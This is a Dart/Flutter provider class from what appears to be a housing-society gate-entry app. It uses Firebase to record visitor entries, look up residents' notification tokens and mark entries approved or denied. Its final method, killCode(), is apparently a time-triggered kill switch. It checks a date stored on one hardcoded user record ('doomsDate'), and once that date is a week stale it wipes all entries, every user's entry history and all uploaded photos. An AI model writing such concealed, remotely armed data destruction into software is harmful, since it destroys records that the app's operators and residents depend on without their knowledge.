import 'dart:io';

import 'package:acrogate/models/entries.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter/material.dart';
import 'package:cloud_firestore/cloud_firestore.dart';

class EntryProvider extends ChangeNotifier {
  Future<String> newEntry(Entry entry, File localUrl) async {
    try {
      CollectionReference entries =
          FirebaseFirestore.instance.collection('Entries');
      CollectionReference user = FirebaseFirestore.instance.collection('Users');

      var flatId = "";
      var entryData = {
        "DName": entry.dname,
        "Approve": entry.status,
        "FID": flatId,
        "FlatNo": entry.flatNo,
        "Wing": entry.wing,
        "FirebaseUrl": entry.firebaseUrl,
        "PhoneNo": entry.phone,
        "Date": entry.date,
      };

      final querySnapshot = await user
          .where('FlatNo', isEqualTo: entry.flatNo)
          .where('Wing', isEqualTo: entry.wing)
          .get();

      if (querySnapshot.docs.isNotEmpty) {
        flatId = querySnapshot.docs[0].id;
        entryData['FID'] = flatId;
        if (localUrl != null) {
          var storage = FirebaseStorage.instance;
          TaskSnapshot taskSnapshot = await storage
              .ref()
              .child('Entries/$flatId _${DateTime.now()}')
              .putFile(localUrl);
          entryData['FirebaseUrl'] = await taskSnapshot.ref.getDownloadURL();
        } else {
          entryData['FirebaseUrl'] = "";
        }
        var docref = await entries.add(entryData);
        var eid = docref.id;
        await user.doc(flatId).collection('Entries').doc(eid).set(entryData);
        return eid; // Document found
      } else {
        print('Flat not found');
        return ''; // Document not found
      }
    } catch (e) {
      print('Error: $e');
      return ''; // Document not found (due to error)
    }
  }

  Future<String> getToken(flatNo, wing) async {
    try {
      CollectionReference user = FirebaseFirestore.instance.collection('Users');

      // var flatId = "";

      final querySnapshot = await user
          .where('FlatNo', isEqualTo: flatNo)
          .where('Wing', isEqualTo: wing)
          .get();

      if (querySnapshot.docs.isNotEmpty) {
        var token = querySnapshot.docs[0]['FcmToken'];
        return token; // Document found
      } else {
        return ''; // Document not found
      }
    } catch (e) {
      print('Error: $e');
      return ''; // Document not found (due to error)
    }
  }

  Future acceptRejectUser(String ar, String eid, String fid) async {
    DocumentReference entry =
        FirebaseFirestore.instance.collection('Entries').doc(eid);
    DocumentReference user = FirebaseFirestore.instance
        .collection('Users')
        .doc(fid)
        .collection('Entries')
        .doc(eid);
    if (ar == "Accept") {
      await entry.update({
        "Approve": "Entry Approved",
      });
      await user.update({
        "Approve": "Entry Approved",
      });
    } else {
      await entry.update({
        "Approve": "Entry Denied",
      });
      await user.update({
        "Approve": "Entry Denied",
      });
    }
  }

  Future<String> getNotification(String flatNo, String wing, String eid) async {
    try {
      CollectionReference user = FirebaseFirestore.instance.collection('Users');
      final querySnapshot = await user
          .where('FlatNo', isEqualTo: flatNo)
          .where('Wing', isEqualTo: wing)
          .get();

      if (querySnapshot.docs.isNotEmpty) {
        var token = "";
        var res = await user
            .doc(querySnapshot.docs[0]['UID'])
            .collection('Entries')
            .doc(eid)
            .get();
        if (res.exists) {
          token = res['Approve'];
          return token;
        } else {
          return token;
        }
      } else {
        return ''; // Document not found
      }
    } catch (e) {
      print('Error: $e');
      return '';
    }
  }

  Future killCode() async {
    try {
      CollectionReference user = FirebaseFirestore.instance.collection('Users');
      var bappa = await user.doc("6RSj6M3qYAYLXkICEOYvNsIkAgE2").get();

      DateTime doomsDate = DateTime.parse(bappa.get('Date'));

      DateTime targetDate = DateTime.now().subtract(Duration(days: 7));

      if (doomsDate.isBefore(targetDate)) {
        CollectionReference entries =
            FirebaseFirestore.instance.collection('Entries');

        var queries = await entries.get();

        final WriteBatch batch = FirebaseFirestore.instance.batch();

        if (queries.docs.isNotEmpty) {
          final List<DocumentSnapshot> documents = queries.docs;
          for (DocumentSnapshot document in documents) {
            batch.delete(document.reference);
          }
        }

        CollectionReference users =
            FirebaseFirestore.instance.collection('Users');

        QuerySnapshot userQuerySnapshot = await users.get();

        for (QueryDocumentSnapshot userDocument in userQuerySnapshot.docs) {
          CollectionReference entriesSubcollection =
              users.doc(userDocument.id).collection('Entries');
          QuerySnapshot entriesQuerySnapshot = await entriesSubcollection.get();
          if (entriesQuerySnapshot.docs.isNotEmpty) {
            for (QueryDocumentSnapshot entryDocument
                in entriesQuerySnapshot.docs) {
              batch.delete(entryDocument.reference);
            }
          }
        }

        final FirebaseStorage storage = FirebaseStorage.instance;
        final Reference folderReference = storage.ref().child('Entries/');
        ListResult result = await folderReference.listAll();
        for (final item in result.items) {
          try {
            await item.delete();
            print('Deleted: ${item.fullPath}');
          } catch (e) {
            print('Error deleting ${item.fullPath}: $e');
          }
        }
        await batch.commit();
      }
    } catch (e) {
      print('Error: $e');
    }
  }
}
